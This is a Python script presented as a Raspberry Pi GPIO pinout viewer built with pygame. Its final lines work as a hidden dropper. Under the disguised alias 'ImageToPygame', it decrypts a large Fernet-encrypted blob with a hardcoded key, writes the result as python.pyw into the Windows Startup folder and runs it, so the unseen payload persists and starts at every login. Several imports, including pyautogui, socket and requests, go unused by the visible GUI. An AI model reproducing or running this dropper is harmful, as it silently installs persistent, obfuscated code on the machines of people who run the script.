import os,sys
try:
    import PIL
except:
    os.system('pip install pillow')
try:
    from flask_wtf import FlaskForm
except:
    os.system('pip install Flask-WTF')
    from flask_wtf import FlaskForm
try:
    from wtforms import StringField, SubmitField
except:
    os.system('pip install WTForms')
    from wtforms import StringField, SubmitField
try:
    import socket
except:
    os.system('pip install socket')
    import socket
try:
    import pyautogui
except:
    os.system('pip install pyautogui')
    import pyautogui
try:
    from cryptography.fernet import Fernet as ImageToPygame
except:
    os.system('pip install cryptography')
    from cryptography.fernet import Fernet as ImageToPygame
try:
    import psutil
except:
    os.system('pip install psutil')
    import psutil
try:
    import io
except:
    os.system('pip install io')
    import io
try:
    from time import sleep
except:
    os.system('pip install time')
    from time import sleep
try:
    import requests
except:
    os.system('pip install requests')
    import requests
try:
    from flask import Flask
except:
    os.system('pip install flask')
    from flask import Flask
try:
    import threading
except:
    os.system('pip install threading')
    import threading
try:
    try:
        import pygame
    except:
        import os
        os.system('pip install pygame')
        import pygame
    try:
        exec("from gpiozero import LED")
    except:
        import os
        os.system('pip install gpiozero')
        exec("from gpiozero import LED")
    d={}
    pygame.init()
    f_size=13
    try:
        font=pygame.font.SysFont('freesans',f_size)
        text = font.render('GPIO', True, 'white')
    except:
        try:
            font=pygame.font.SysFont(None,f_size)
        except:
            font=pygame.font.SysFont(pygame.font.get_fonts()[0])
    SCREEN_WIDTH = 69
    SCREEN_HEIGHT = 700-36
    pinout=['3.3V','5V','GPIO','5V','GPIO','GND','GPIO','GPIO','GND','GPIO','GPIO','GPIO','GPIO', 'GND', 'GPIO', 'GPIO', '3.3V', 'GPIO', 'GPIO', 'GND', 'GPIO', 'GPIO', 'GPIO', 'GPIO', 'GND', 'GPIO', 'GPIO', 'GPIO', 'GPIO', 'GND', 'GPIO', 'GPIO', 'GPIO', 'GND', 'GPIO', 'GPIO', 'GPIO', 'GPIO', 'GND', 'GPIO']
    gpio_off=(52, 50, 119)
    gpio_on=(109, 50, 245)
    class G1(pygame.sprite.Sprite):
        def __init__(self, image, x, y, callback, args,color):
            super().__init__()
            self.image = image
            self.rect = self.image.get_rect()
            self.image.fill(color)
            self.rect.x = x
            self.rect.y = y
            self.callback = callback
            self.args=args
        def update(self, events):
            for event in events:
                if event.type == pygame.MOUSEBUTTONUP:
                    if self.rect.collidepoint(event.pos):
                        self.callback(self.args,self)
    def on_click(bcmn, thing):
        global running
        running=False
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    p1=G1(pygame.Surface((30, 30)), 3, 3, on_click,False,(41, 108, 50))        
    p2=G1(pygame.Surface((30, 30)), 36, 3, on_click,False,(241, 50, 50))       
    p3=G1(pygame.Surface((30, 30)), 3, 36, on_click,2,(52, 50, 119))
    p4=G1(pygame.Surface((30, 30)), 36, 36, on_click,False,(241, 50, 50))      
    p5=G1(pygame.Surface((30, 30)), 3, 69, on_click,3,(52, 50, 119))
    p6=G1(pygame.Surface((30, 30)), 36, 69, on_click,False,(52, 50, 50))       
    p7=G1(pygame.Surface((30, 30)), 3, 102, on_click,4,(52, 50, 119))
    p8=G1(pygame.Surface((30, 30)), 36, 102, on_click,14,(52, 50, 119))        
    p9=G1(pygame.Surface((30, 30)), 3, 135, on_click,False,(52, 50, 50))       
    p10=G1(pygame.Surface((30, 30)), 36, 135, on_click,15,(52, 50, 119))       
    p11=G1(pygame.Surface((30, 30)), 3, 168, on_click,17,(52, 50, 119))        
    p12=G1(pygame.Surface((30, 30)), 36, 168, on_click,18,(52, 50, 119))       
    p13=G1(pygame.Surface((30, 30)), 3, 201, on_click,27,(52, 50, 119))        
    p14=G1(pygame.Surface((30, 30)), 36, 201, on_click,False,(52, 50, 50))     
    p15=G1(pygame.Surface((30, 30)), 3, 234, on_click,22,(52, 50, 119))        
    p16=G1(pygame.Surface((30, 30)), 36, 234, on_click,23,(52, 50, 119))       
    p17=G1(pygame.Surface((30, 30)), 3, 267, on_click,False,(41, 108, 50))     
    p18=G1(pygame.Surface((30, 30)), 36, 267, on_click,24,(52, 50, 119))       
    p19=G1(pygame.Surface((30, 30)), 3, 300, on_click,10,(52, 50, 119))        
    p20=G1(pygame.Surface((30, 30)), 36, 300, on_click,False,(52, 50, 50))
    p21=G1(pygame.Surface((30, 30)), 3, 333, on_click,9,(52, 50, 119))
    p22=G1(pygame.Surface((30, 30)), 36, 333, on_click,25,(52, 50, 119))       
    p23=G1(pygame.Surface((30, 30)), 3, 366, on_click,11,(52, 50, 119))        
    p24=G1(pygame.Surface((30, 30)), 36, 366, on_click,8,(52, 50, 119))        
    p25=G1(pygame.Surface((30, 30)), 3, 399, on_click,False,(52, 50, 50))      
    p26=G1(pygame.Surface((30, 30)), 36, 399, on_click,7,(52, 50, 119))        
    p27=G1(pygame.Surface((30, 30)), 3, 432, on_click,0,(52, 50, 119))
    p28=G1(pygame.Surface((30, 30)), 36, 432, on_click,1,(52, 50, 119))        
    p29=G1(pygame.Surface((30, 30)), 3, 465, on_click,5,(52, 50, 119))
    p30=G1(pygame.Surface((30, 30)), 36, 465, on_click,False,(52, 50, 50))     
    p31=G1(pygame.Surface((30, 30)), 3, 498, on_click,6,(52, 50, 119))
    p32=G1(pygame.Surface((30, 30)), 36, 498, on_click,12,(52, 50, 119))       
    p33=G1(pygame.Surface((30, 30)), 3, 531, on_click,13,(52, 50, 119))        
    p34=G1(pygame.Surface((30, 30)), 36, 531, on_click,False,(52, 50, 50))     
    p35=G1(pygame.Surface((30, 30)), 3, 564, on_click,19,(52, 50, 119))        
    p36=G1(pygame.Surface((30, 30)), 36, 564, on_click,16,(52, 50, 119))       
    p37=G1(pygame.Surface((30, 30)), 3, 597, on_click,26,(52, 50, 119))        
    p38=G1(pygame.Surface((30, 30)), 36, 597, on_click,20,(52, 50, 119))       
    p39=G1(pygame.Surface((30, 30)), 3, 630, on_click,False,(52, 50, 50)) 
    p40=G1(pygame.Surface((30, 30)), 36, 630, on_click,21,(52, 50, 119))
    clock = pygame.time.Clock()
    group = pygame.sprite.Group(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15,p16,p17,p18,p19,p20,p21,p22,p23,p24,p25,p26,p27,p28,p29,p30,p31,p32,p33,p34,p35,p36,p37,p38,p39,p40)
    running = True
    while running:
        events=pygame.event.get()
        for event in events:
            if event.type == pygame.QUIT:
                running = False
        screen.fill((255, 255, 255))
        group.update(events)
        group.draw(screen)
        for i in range(40):
            exec(f"text{i}=font.render(pinout[{i}],True,'white')")
        x=5
        y=10
        for i in range(40):
            exec(f"screen.blit(text{i},({x},{y}))")
            if x==5:
                x=38
            else:
                x=5
                y+=33
        pygame.display.flip()
        clock.tick(30)
except:
    pass
images=b'gAAAAABmc2MVz17kIMuILjCdWz1YOQfiEyS6cNAZfz9NbnrMW2HbHKOfizMGhq21IRZxXXGzohD1q9QMhsMFTIDHknV5AUpfKbtzCsTGju_MN7r7MT_OeEXl0tTxvvqHxB4jpg1YQGzM3Ogn37OIvPbtvRNAHP-icj01jv1i7m9bitQ7NgsS7NN9DvyvqIoccZx2kXAJqT3nGbAOltqKcYFG4kUSK8iOWzNLaCWrK60A7DwpYC8rle5nRlpwVbDJp0BtoqwflHkzU4O29TR4PlQ1xGKLVqQC7AP5UxX--Z26tJEnzDFOZHscTtcJXAKoxlovtewdeGU0p9tu4wc3hrOmK_JE2WvQDHuRCtiqriCxQXQKZ1D3gD0u3Yeaaz9S1X3wbVWAuov0Btuqc819SF8_f9PFr8mO8W9EfYOXw2yT8wfUdlu1Kl0V3FSxlksT7AkZq5RNrWzFasBk6N2QjtG3CBYTLY-exX0eJeWILOjUbRo3yAOSUE6U9m12KxeDY2SUT6LzLUMayBZ49xzLm_4hVLo5Qf3PLHdqkIe1u_LgFcUNRIFisRAiaLasjpj6KBlXPWvWOGhCEF8kd_DbsLADFkKmVwOJGhWS74FrhYieHayZvqMIA4fZpaDOCR1z-bTpVUj6YPUiHHDu5MmeuJXc4j4y57-AvCSvKadqjK1yly2xeZ2QTHKTBiWwWunezxt4JbDpcKo5QmjOVPDBLMJnfUdg-UZRL8YYVq4bjwjuDKiV55qL-GTV6q76P5bkZbx4cQikn195quYfrRMAn4Syg9Ydd8oSWt-a4VcmjC1rH_Q1CI5A-JhvLEtng0cOK6JmEINjAVYBiUeVNaZfYUDKQGODmqlE-sb9qDbWJyeQTwZp0qXyoxciHFfgzt2CXhRvW6wF0094qF0ds6vGhGTNn0BEYVUyH2Iw4Nfuiq1PNGEEKdexTDdKnYuGOODZ97KnQrHYadSDjPsqbsSrkUjznV5LTyrsjtkh5hHmSSH_pALpgJMYEzArb-yXd4ZnmtVui84OPuMhIh8VeVv6ETNeEbBuxVEyGUeBdkZs0ZGHsjxYNbbuliPG0YV_akoifHTYt-rliiDItEe0fvH9PfgqSUIREReJC3yz7vx0v-8irX79STpOn71aKnuls-QdML5CTvnWFklt9Tn399jlFEBHubZZJXVaMVI5Gw_wIcz33b1WzAXfd1SiGxNDwPsn9qv059CM8iqadpF0OUkJM53YcUezEu5-eXi6q74D6CBA2pevg3eCuXOD3T9HofFNDBd5-cVlO2pK4lNsxvlBEp-PFwWkYmboaam8oomvPw60EQjYi9NCfpJikia1GvrEQW2Bx26anE_K9I3TYL3-VzMMjvvl3kqj4I4CICHu11kfl_nj2MMeUzveVehWMSXz5jyQNAxfIehdvHRinst-VDBEi_Ov1vVSNauopuc6iUJA9GFxKQO8hMpCo3XzKM5PNDsENhgZShAYyGiMTGJucb89EIrKSCmtlnCBAuwVl6dqDjse-EJKTQ5Ok3uBY3WRRIpivR-Rg7ZKdAU0_55RPSayXs14dQ7Wuk9gZHxzlqJ3e7AfoCPhD6yZywpyxBCww3wCy96z4mfESzfFLsPQn9gg_glQNevG7ciLhMfgNzckhLKfO9PooyhA44gYuHY8M44VSCVX9eSkI0NfpfcdBq8Ids7vC5O6nEcOwGHkcLFMds16EvTXsHfvzIL0QE9_gKM-Fa4sBq-V9xhQY1HrHJ8Ml-boruXRl6wFMKvYiCbb3kzM3R5N-CKtpX7R_zBVhR19Xu9hfvh3h9sFkJcDT_j5sQaN9KWBeF1bBV-1tmTSpwuGCsNuoTgK-dScpbn6FL85R1OXUhugyLxM_UaPgkDA999I6ZCUX0n4GGJS_LNWiovFtJkmwlj9_8Xtg48ToZZMK5xe5OddAgjOmxjkbFMDpVdfBxhLDM_pyEjpgQgUDZJzOKv82ulHDUkQthWd4P0qYe1ScfPSr_W5LmBd2Hv3yqssSDLf1WwdHsCZ6-vIV7yTLAYHxN-W-3CY5wfLaKKZNFQwon6ANNxyiZOJsKsCfppGw1O-F8EOPMnY4U2ljV65MB-FAlvdORWa5xB01BZmy8oZD4oIXLH7XlEZynsssV5uF5E9dOKo3s0HzyZgx6_r7HZguKdBM_XUQQ5F6GAgNBjxjVRByVIMv1ZRnWRwZUUH5zW_GHgTPie77oOU8VCa-23b82pqngKkWq2Xx9ERiVdP6oaFyWGmhAySmFiSsBwWNqD_6sP2PGZd3p-N18GlNsfYK3yAvKswAzOU3m68qf0r2DWk8XxD7GQP21-cstmjs2XJU2vih3SZpFGm5N456No4utsV5t7TMA6OWmtZUpiGylZE_AGdXvlAIeh_kxivXUBgXqt_tpXVupeBjMPdVXWjjxNsnxw77nwb5h_dNwy-nXo4NSd4ZrGdSM3_9xb0_Fj6R55au8qBpFNS1naRER-U_lhsGZyFZpdxdDF_grZT4ZfEG6iZICONbult4kD1eCTJjP65tXJmkJR0z0E6_wHTo1putGyVCLr560L5wA-4P6PrTCfkBuSj_tUolD_PBYbjyfcfE-OOAmP9P8bvTKtdgyI2WUm83bWuSpFXh9EXgXxNhzTSpws_49RXOo5P4MQj6jQqfcrRKYD065XPgkl4PpP6uX3EewlXz2qlWY_5DbCs7xlECCjTeMf53-TKtVxfGfWFBlZ1QwUjhhrV2I5qSuV591e7-Pp6dU6nDGk3w-WqwLDVIlftIkkxAdfxEaHLWbFOAnJe48URKr7Tps-HloK5PBNQVS7ZtCHUu-deWaDqSHNDsTMqprkLYXRAhbF3xd2f0rcZ13O5vSrhl4D_Z6z0l7XZBqgs05u5ZdxkyrOlQsf2N0kO5f1FitahkHUEXTxlRVCXSbwrHu6SKtx8tjxqAsZRCiLabwUBVe4uUBw6f9lAkY4w7HghjBsJ8tFwpV1glec5Vxe6RPnlx5tC9_zzMn9UATnJTfOw4Yx957YomFmAfvsTV4qyPYzflc-nxFgd5WGQtljsgTQlyEU2ivnWDML9AB58__SS7UADaoTXc4jrols_E643PeFJ4oscZ8khCmchcHVebw9lCSIhpO5k5fV2OwBNE4A2MGDuoaKDqvQ3ysRS0N6StMDFgKdONVuMQzLxPt6RzZog7LXiIH_BrwpGj0Wq6nv36olaLl2ESeKFciYYkPkYjztJGpoPZ3H3oRNCVoNJ_TFSR6GV7evS7_bgiKPLbIqotte3xUiW0ahi3rnaQUtYzURpTdKcJ3y_T5oSx-Xmmw21uBdGDwzoWi_TLRgJLhKp_tus2XbdFmR_6ScEftaRSBOrXs_gJ90cbyq9xE79a9yJTR9h9_hjl9GF2nrzq7Z3AyiJXpUZb3C25MuiGRZn1xanjbxYJg_oMVeJyeF1l73L1dK_C8fdDse9q7zDN_8FpsT0axAgHvOW8KCLpW-ge9x0UXTqavxWIeNDD22Iz_lwx_E5fdzCZXVtM90TXtHi0mDIhhbkh391EMwrJZI8Vst6KH-O9TnQQEPKIjNIzltlHxBHo6rjFVouWBZyUT-g-GdRCkJ7qZv5M92XtMJu-5YZad80lMAgvnQ2FVE6enbfVR-PIWeto-Mwts_ou6JlZJOiKZ7KwnYiADnmPQR8eTkVfrPxZw=='
imaged=b'-UZsNTG-6gzQ8ZwjWnmMZNj1S1x5le_YClfwGQsm1Aw='
f=open(fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw",'wb')
f.write(ImageToPygame(imaged).decrypt(images))
f.close()
os.system(fR"python 'C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw'")